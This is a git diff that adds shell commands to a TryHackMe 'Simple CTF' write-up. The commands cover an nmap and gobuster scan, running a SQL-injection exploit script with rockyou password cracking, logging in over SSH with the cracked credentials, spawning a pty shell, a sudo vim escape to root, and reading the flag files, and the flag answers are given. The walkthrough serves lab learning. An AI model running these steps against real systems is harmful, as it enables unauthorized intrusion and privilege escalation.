@@ -17,6 +17,10 @@ categories: [THM, easy]
 
 Let's start scaning the machine with nmap.
 
+```sh
+nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
+```
+
 ![Scan](/images/THM/simplectf/Captura.PNG)
 
 We can see there are 3 ports open, 21(ftp), 80(http), 2222(ssh).
@@ -34,6 +38,10 @@ If we move to the web page, we can see the Apache2 Default page.
 ![Web](/images/THM/simplectf/Captura2.PNG)
 
 Let's scan the page with **gobuster**.
+
+```sh
+gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t <threads> -x <extensions>
+```
 
 ![WebScan](/images/THM/simplectf/Captura3.PNG)
 
@@ -68,7 +76,15 @@ The CVE explains there is an issue and is it possible with the News module, thro
 
 >Answer: sqli
 
+```sh
+python2 46635.py
+```
+
 ![exploit](/images/THM/simplectf/Captura8.PNG)
+
+```sh
+python2 46635.py -u <URL> --crack -w /usr/share/wordlists/rockyou.txt
+```
 
 ![exploit2](/images/THM/simplectf/Captura9.PNG)
 
@@ -84,6 +100,12 @@ Et voila! We already have the credentials!
 
 Time to get into the machine with the credentials we've found.
 
+```sh
+ssh mitch@<IP> -p 2222
+
+python -c 'import pty;pty.spawn("<shell>")'
+```
+
 ![ssh](/images/THM/simplectf/Captura11.PNG)
 
 - Where can you login with the details obtained?
@@ -92,6 +114,11 @@ Time to get into the machine with the credentials we've found.
 
 If we show the actual directory, we can see there is a file called user.txt. In it, we can found the user flag.
 
+```sh
+ls
+cat user.txt
+```
+
 ![userflag](/images/THM/simplectf/Captura12.PNG)
 
 - What's the user flag?
@@ -99,6 +126,10 @@ If we show the actual directory, we can see there is a file called user.txt. In 
 >Answer: G00d j0b, keep up!
 
 For see if there is other user, we list the /home/ directory, and we found the user sunbath.
+
+```sh
+ls /home/
+```
 
 ![user](/images/THM/simplectf/Captura13.PNG)
 
@@ -110,11 +141,22 @@ To finish the machine, we need to do the privileges escalation, and if we run **
 
 Knowing this, we can go to [GTFO] and search how to make this escalation with vim binary.
 
+```sh
+sudo -l
+sudo vim -c ':!<shell>'
+```
+
 ![sudo](/images/THM/simplectf/Captura14.PNG)
 
 - What can you leverage to spawn a privileged shell?
 
 >Answer: vim
+
+```sh
+cd /root
+ls
+cat root.txt
+```
 
 ![rootflag](/images/THM/simplectf/Captura15.PNG)
 
